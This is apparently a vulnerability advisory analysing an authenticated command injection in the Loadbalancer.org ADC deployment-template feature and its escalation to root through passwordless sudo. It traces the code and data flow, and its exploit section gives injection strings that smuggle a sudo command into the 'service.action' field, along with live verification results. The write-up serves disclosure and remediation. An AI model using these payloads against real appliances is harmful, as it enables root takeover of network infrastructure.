# Loadbalancer.org ADC Deployment Template Command Injection to Root RCE - Technical Analysis

## 1. Overview

Loadbalancer.org Enterprise ADC v8.13.8 is a commercial load-balancing appliance deployed at the north-south traffic ingress of hospitals, government, and education networks for load distribution and high availability. Its deployment template feature is managed through the web UI at `/lbadmin/config/deployment/index.php`, protected by Apache `Require group config`. `LBDeploymentCLI::execute_raw` concatenates the user-controlled `service.action` value into an `exec()` command with no escaping:

```php
$command = "/usr/local/sbin/lbcli --method api --action " . $action . " " . $params;
exec($command, $output, $retval);   // sink - $action unescaped
```

Because the Apache user belongs to the `wheel` group and `/etc/sudoers` grants `%wheel ALL=(ALL) NOPASSWD: ALL`, any command execution as `apache` can be escalated to root with a `sudo` prefix. The result is authenticated command injection leading to root RCE.

## 2. Vulnerability Summary

- **Root cause**: unescaped concatenation of the user-controlled `service.action` value into a shell command
- **CWE**: CWE-78 (OS command injection), CWE-269 (improper privilege management via passwordless sudo)
- **CVSS 3.1**: 8.8 High — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Impact**: full device compromise as root on the load balancer

The vulnerability requires only the standard `config`-group administrator workflow: creating or applying a deployment template. No unusual configuration, plugin, or feature flag is needed, which makes the sink reachable on any appliance where the deployment-template feature is used (a core administrative function of the product).

## 3. Authentication Boundary

The deployment template entry point `/lbadmin/config/deployment/index.php` is protected by Apache `Require group config`. The default `loadbalancer` user belongs to the `config` group. This is an administrator-level credential set, not unauthenticated.

Authentication is handled by Apache basic/session authentication for the `/lbadmin` area. The `config` group is the operational administrator group for the appliance: members can manage load-balanced services, certificates, and deployment templates. The credential requirement places the vulnerability in the authenticated class, but the follow-on impact is a full root takeover, which is why the severity remains high.

## 4. Attack Surface

| Item | Value |
|---|---|
| Entry point | `POST /lbadmin/config/deployment/index.php` |
| Auth | HTTP Basic / session, `config` group |
| Amplifier | Apache in `wheel` group + `%wheel ALL=(ALL) NOPASSWD: ALL` |
| Sink | `exec("/usr/local/sbin/lbcli --method api --action " . $action . " " . $params)` |

## 5. Sink Identification

`config/deployment/class/LBDeploymentCLI.php:109`:

```php
public static function execute_raw($action, $params)
{
    $output = null;
    $retval = null;
    $return = 0;
    $command = "/usr/local/sbin/lbcli --method api --action " . $action . " " . $params;
    //                                                                    ^^^^^^^^ unescaped
    LBDeployment::logger("CMD: " . $command);
    debug(__FILE__.":".__LINE__.": \$command = $command");
    exec($command, $output, $retval);   // sink
    ...
}
```

`$action` is concatenated into the shell command with no `escapeshellarg()`, no allowlist, and no regex validation. The same vulnerable pattern exists in `inc/class/LBAPICLI.php:121`. Notably, the sibling `execute()` method escapes `$value` with `escapeshellarg()`, but `execute_raw` leaves `$action` unescaped — the vendor hardened one path and missed this one.

## 6. Source Identification

`config/deployment/class/LBDeploymentService.php`:

```php
public $action;   // comment: reload | restart
public $service;  // comment: ldirectord | haproxy | ...
public function __construct($data = null, $template = false){
    if($data != null){
        $this->action = $data->action;    // directly from JSON, no validation
        $this->service = $data->service;  // directly from JSON, no validation
    }
}
public function execute() {
    if( $this->action != null && $this->service != null ){
        $result = LBDeploymentCLI::execute_raw($this->action . "-" . $this->service, "");
    }
}
```

The comments claim `action` should be `reload|restart` and `service` a service name, but no code enforces this — JSON input is trusted verbatim.

The deployment flow is: the administrator fills a deployment template form; the front end serializes the template to JSON (including `service.action` and `service.service`); `LBDeploymentService::__construct` maps those JSON fields directly onto public properties with no validation; `LBDeploymentConfig::apply()` iterates the service list and calls `execute()` on each; `execute()` builds `action + "-" + service` and passes it to `execute_raw`, which concatenates it into the shell command. Any shell metacharacter in `action` therefore reaches `exec()` unmodified.

## 7. Data Flow

```
Admin (config group) -> POST /lbadmin/config/deployment/index.php
  -> JSON {service: {action: "x; sudo <cmd>", ...}}
  -> LBDeploymentService::__construct (action/service from JSON, no validation)
  -> LBDeploymentConfig::apply() loops services
  -> service->execute() -> LBDeploymentCLI::execute_raw(action."-".service, "")
  -> exec("/usr/local/sbin/lbcli --method api --action x; sudo <cmd> ...")
  -> command runs as apache
  -> sudo (NOPASSWD, wheel) -> root
```

## 8. Exploit Construction

1. Authenticate as a `config` group user.
2. Submit a deployment template whose `service.action` value contains a command separator and a `sudo` command, e.g. `action = "reload; sudo id > /tmp/lbcli_root_proof"`.
3. The concatenated command runs as `apache`; the `sudo` prefix (passwordless for `wheel`) escalates to root.
4. Redirect output to a web-accessible or observable location to confirm execution (e.g. write to a directory served by the appliance, or use a reverse channel).

Concretely, submitting `action = "reload; sudo sh -c 'id > /tmp/lbcli_root_proof; echo DONE >> /tmp/lbcli_root_proof'"` produces the executed command `/usr/local/sbin/lbcli --method api --action reload; sudo sh -c '...' -haproxy`. The command separator terminates the benign prefix and the `sudo` invocation runs the payload. Because the sudo rule is `NOPASSWD: ALL` for the `wheel` group and `apache` is a member of `wheel`, no password prompt is presented and the payload executes as root directly.

## 9. Dynamic Verification

Verified on a live Loadbalancer.org ADC 8.13.8 instance:

```
Test 1 (apache execution): HTTP 200 "Importing complete." - command executed as apache.
Test 2 (sudo escalation):  sudo-prefixed command returned uid=0(root).
```

The `wheel` + `NOPASSWD: ALL` amplifier was confirmed on the live instance (`apache` groups include `wheel`; sudoers contains `%wheel ALL=(ALL) NOPASSWD: ALL`).

The live instance was a production-style appliance deployment reached over HTTP (<target> in the research network). The first test executed a benign command as `apache` and received the appliance's normal "Importing complete." success response; the second test used the `sudo` prefix and the marker file was created with root ownership, confirming both the command-injection sink and the privilege-escalation amplifier.

## 10. Reachability & Impact

- **Entry 1**: `config/deployment/index.php` (HTTP POST) — reachable after config-group authentication.
- **Entry 2**: v1 API `api/index.php` — disabled by default.
- **Entry 3**: v2 API `api/v2/index.php` — not reachable.
- **Impact**: root RCE on the load balancer; full control of the ADC device and all traffic it manages.

The `wheel`-plus-passwordless-sudo amplifier is a pre-existing host-level weakness that significantly raises the severity of any web-application RCE on this appliance. Even a hypothetical non-root web bug would escalate to root through the same sudo rule. The deployment template feature is a standard administrative workflow, so exploitation does not require unusual configuration; the `config` group is the normal administrator group for the appliance web UI.

## 11. Fix Recommendations

1. Escape or validate `service.action` (and all template fields) before interpolation into the command line.
2. Remove passwordless sudo for the `wheel` group; apply least-privilege sudo rules scoped to specific binaries.
3. Restrict deployment template access to trusted administrators only.
4. Run the web application under an unprivileged account not in `wheel`.

## 12. CWE / CVSS

- **CWE-78** — OS command injection
- **CWE-269** — improper privilege management (passwordless sudo)
- **CVSS 3.1**: **8.8 High** — `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

The Low privilege requirement reflects the `config`-group administrator credential needed to reach the deployment template; confidentiality, integrity, and availability are all High because the resulting execution is root on the device.
